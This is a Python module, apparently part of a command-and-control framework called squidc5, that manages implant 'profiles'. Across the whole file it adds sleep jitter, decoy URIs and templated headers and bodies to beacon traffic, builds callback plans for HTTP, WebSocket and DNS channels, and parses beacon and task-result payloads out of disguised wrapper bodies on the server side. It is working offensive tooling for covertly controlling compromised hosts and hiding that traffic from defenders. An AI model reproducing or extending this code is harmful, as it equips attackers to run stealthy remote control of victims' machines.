"""Profile engine: jitter, request shaping, decoy plan, runtime active profile."""

from __future__ import annotations

import json
import random
import re
import secrets
import uuid
from typing import Any

from squidc5.db.store import Database
from squidc5.profiles.models import DEFAULT_PROFILES, C2Profile

_PLACEHOLDER = re.compile(r"\{(uuid|beacon|rand)\}")


class ProfileEngine:
    def __init__(self, db: Database) -> None:
        self.db = db
        self._cache: dict[str, C2Profile] = {}
        self._active_id: str | None = None

    async def load(self) -> None:
        rows = await self.db.list_profiles()
        if not rows:
            for p in DEFAULT_PROFILES:
                await self.db.upsert_profile(p.id, p.name, p.to_dict(), active=p.active)
            rows = await self.db.list_profiles()
        self._cache.clear()
        self._active_id = None
        for row in rows:
            data = row["config"] if isinstance(row["config"], dict) else json.loads(row["config"])
            data["id"] = row["id"]
            data["name"] = row["name"]
            data["active"] = bool(row.get("active"))
            prof = C2Profile.from_dict(data)
            self._cache[prof.id] = prof
            if prof.active:
                self._active_id = prof.id
        if self._active_id is None and self._cache:
            # ensure one active
            first = next(iter(self._cache.values()))
            await self.set_active(first.id)

    def list_profiles(self) -> list[dict[str, Any]]:
        return [p.to_dict() for p in self._cache.values()]

    def get(self, profile_id: str) -> C2Profile | None:
        return self._cache.get(profile_id)

    def active(self) -> C2Profile | None:
        if self._active_id:
            return self._cache.get(self._active_id)
        return None

    async def set_active(self, profile_id: str) -> C2Profile:
        if profile_id not in self._cache:
            raise KeyError(profile_id)
        await self.db.set_active_profile(profile_id)
        for pid, p in self._cache.items():
            p.active = pid == profile_id
        self._active_id = profile_id
        return self._cache[profile_id]

    async def upsert(self, profile: C2Profile) -> C2Profile:
        await self.db.upsert_profile(
            profile.id, profile.name, profile.to_dict(), active=profile.active
        )
        self._cache[profile.id] = profile
        if profile.active:
            await self.set_active(profile.id)
        return profile

    @staticmethod
    def compute_sleep(base_sec: float, jitter_pct: float, rng: random.Random | None = None) -> float:
        """Sleep with jitter: base ± (jitter_pct% of base)."""
        r = rng or random.Random()
        pct = max(0.0, min(100.0, float(jitter_pct))) / 100.0
        delta = base_sec * pct
        return max(0.1, base_sec + r.uniform(-delta, delta))

    def shape_http_request(
        self,
        profile: C2Profile | None,
        beacon_obj: dict[str, Any],
        *,
        rng: random.Random | None = None,
    ) -> dict[str, Any]:
        """Build outbound implant HTTP request description from profile."""
        p = profile or self.active() or DEFAULT_PROFILES[0]
        http = p.http
        r = rng or random.Random()
        uri = r.choice(http.uris) if http.uris else "/api/v1/implant/beacon"
        beacon_json = json.dumps(beacon_obj, separators=(",", ":"))

        def _sub(m: re.Match[str]) -> str:
            key = m.group(1)
            if key == "uuid":
                return str(uuid.uuid4())
            if key == "beacon":
                return beacon_json
            if key == "rand":
                return secrets.token_hex(8)
            return m.group(0)

        headers = {k: _PLACEHOLDER.sub(_sub, v) for k, v in http.headers.items()}
        body = _PLACEHOLDER.sub(_sub, http.request_body_template)
        if "{beacon}" not in http.request_body_template and body == http.request_body_template:
            # template had no placeholder — if still literal, wrap
            if body == "{beacon}" or not body:
                body = beacon_json
        sleep = self.compute_sleep(http.sleep_sec, http.jitter_pct, r)
        decoys: list[str] = []
        if http.decoy_enabled and http.decoy_paths:
            n = min(2, len(http.decoy_paths))
            decoys = r.sample(http.decoy_paths, k=n)
        return {
            "profile_id": p.id,
            "channel": "http",
            "method": http.method,
            "uri": uri,
            "headers": headers,
            "user_agent": http.user_agent,
            "body": body,
            "sleep_sec": round(sleep, 3),
            "decoy_uris": decoys,
        }

    def implant_snippet(self, profile: C2Profile | None, host: str, port: int) -> dict[str, Any]:
        """Deterministic implant callback plan for payload generator."""
        p = profile or self.active() or DEFAULT_PROFILES[0]
        if p.channel == "dns":
            return {
                "channel": "dns",
                "zone": p.dns.zone,
                "record_type": p.dns.record_type,
                "sleep_sec": p.dns.sleep_sec,
                "jitter_pct": p.dns.jitter_pct,
            }
        if p.channel == "ws":
            return {
                "channel": "ws",
                "url": f"ws://{host}:{port}{p.ws.path}",
                "sleep_sec": p.ws.sleep_sec,
                "jitter_pct": p.ws.jitter_pct,
            }
        shaped = self.shape_http_request(p, {"session_id": None, "hostname": "HOST"})
        return {
            "channel": "http",
            "base": f"http://{host}:{port}",
            "uri": shaped["uri"],
            "method": shaped["method"],
            "headers": shaped["headers"],
            "user_agent": shaped["user_agent"],
            "sleep_sec": p.http.sleep_sec,
            "jitter_pct": p.http.jitter_pct,
            "decoy_enabled": p.http.decoy_enabled,
            "decoy_paths": list(p.http.decoy_paths or []),
            "request_body_template": p.http.request_body_template,
            "response_prefix": p.http.response_prefix,
            "response_suffix": p.http.response_suffix,
            "profile_id": p.id,
            "profile_name": p.name,
        }

    # --- Live HTTP path matching / body codec ---

    LEGACY_BEACON_PATHS = frozenset(
        {
            "/api/v1/implant/beacon",
            "/implant/beacon",
            "/beacon",
        }
    )
    LEGACY_RESULT_PATHS = frozenset(
        {
            "/api/v1/implant/beacon/result",
            "/implant/beacon/result",
            "/beacon/result",
        }
    )

    def allowed_beacon_paths(self) -> set[str]:
        paths = set(self.LEGACY_BEACON_PATHS)
        for p in self._cache.values():
            if p.channel == "http":
                for u in p.http.uris or []:
                    if u:
                        paths.add(u if u.startswith("/") else f"/{u}")
        # always include active
        act = self.active()
        if act and act.channel == "http":
            for u in act.http.uris or []:
                if u:
                    paths.add(u if u.startswith("/") else f"/{u}")
        return paths

    def match_beacon_path(self, path: str) -> tuple[str, C2Profile | None]:
        """
        Returns (kind, profile) where kind is 'beacon' | 'result' | ''.
        Profile is the matching profile (or active for legacy paths).
        """
        path_only = (path or "").split("?", 1)[0]
        if not path_only.startswith("/"):
            path_only = "/" + path_only

        if path_only in self.LEGACY_RESULT_PATHS:
            return "result", self.active()
        if path_only in self.LEGACY_BEACON_PATHS:
            return "beacon", self.active()

        # profile result: <uri>/result
        if path_only.endswith("/result"):
            base = path_only[: -len("/result")] or "/"
            for p in self._cache.values():
                if p.channel != "http":
                    continue
                uris = [u if u.startswith("/") else f"/{u}" for u in (p.http.uris or [])]
                if base in uris:
                    return "result", p
            return "", None

        for p in self._cache.values():
            if p.channel != "http":
                continue
            uris = [u if u.startswith("/") else f"/{u}" for u in (p.http.uris or [])]
            if path_only in uris:
                return "beacon", p
        return "", None

    def is_profile_http_path(self, path: str) -> bool:
        kind, _ = self.match_beacon_path(path)
        return kind in ("beacon", "result")

    @staticmethod
    def _looks_like_beacon(obj: dict[str, Any]) -> bool:
        keys = set(obj.keys())
        # AEAD implant envelope (v1)
        if obj.get("v") == 1 and {"n", "c", "alg"}.issubset(keys):
            return True
        return bool(
            keys
            & {
                "session_id",
                "hostname",
                "username",
                "os_info",
                "task_id",
                "result",
                "metadata",
            }
        )

    def unwrap_request_body(
        self,
        profile: C2Profile | None,
        raw: bytes | str | dict[str, Any] | None,
    ) -> dict[str, Any]:
        """Extract beacon/result JSON from raw body (supports profile wrappers)."""
        if raw is None:
            return {}
        if isinstance(raw, dict):
            data: Any = raw
        else:
            if isinstance(raw, bytes):
                text = raw.decode("utf-8", errors="replace").strip()
            else:
                text = str(raw).strip()
            if not text:
                return {}
            # strip optional response-style prefix/suffix if client echoed
            p = profile or self.active()
            if p and p.channel == "http":
                pref = p.http.response_prefix or ""
                suf = p.http.response_suffix or ""
                if pref and text.startswith(pref):
                    text = text[len(pref) :]
                if suf and text.endswith(suf):
                    text = text[: -len(suf)]
            try:
                data = json.loads(text)
            except json.JSONDecodeError:
                return {}

        found = self._extract_beacon_dict(data)
        return found if found is not None else {}

    def _extract_beacon_dict(self, data: Any) -> dict[str, Any] | None:
        if isinstance(data, dict):
            if self._looks_like_beacon(data):
                return data
            # common wrappers
            for key in ("Records", "records", "value", "data", "payload", "body"):
                if key in data:
                    inner = self._extract_beacon_dict(data[key])
                    if inner is not None:
                        return inner
            # first nested dict that looks like beacon
            for v in data.values():
                inner = self._extract_beacon_dict(v)
                if inner is not None:
                    return inner
        elif isinstance(data, list):
            for item in data:
                inner = self._extract_beacon_dict(item)
                if inner is not None:
                    return inner
        return None

    def wrap_response(self, profile: C2Profile | None, obj: dict[str, Any]) -> str:
        p = profile or self.active()
        raw = json.dumps(obj, separators=(",", ":"))
        if not p or p.channel != "http":
            return raw
        return f"{p.http.response_prefix or ''}{raw}{p.http.response_suffix or ''}"

    def apply_body_template(self, profile: C2Profile | None, beacon_obj: dict[str, Any]) -> str:
        """Render request body for implant using profile template."""
        p = profile or self.active() or DEFAULT_PROFILES[0]
        shaped = self.shape_http_request(p, beacon_obj)
        return shaped["body"]

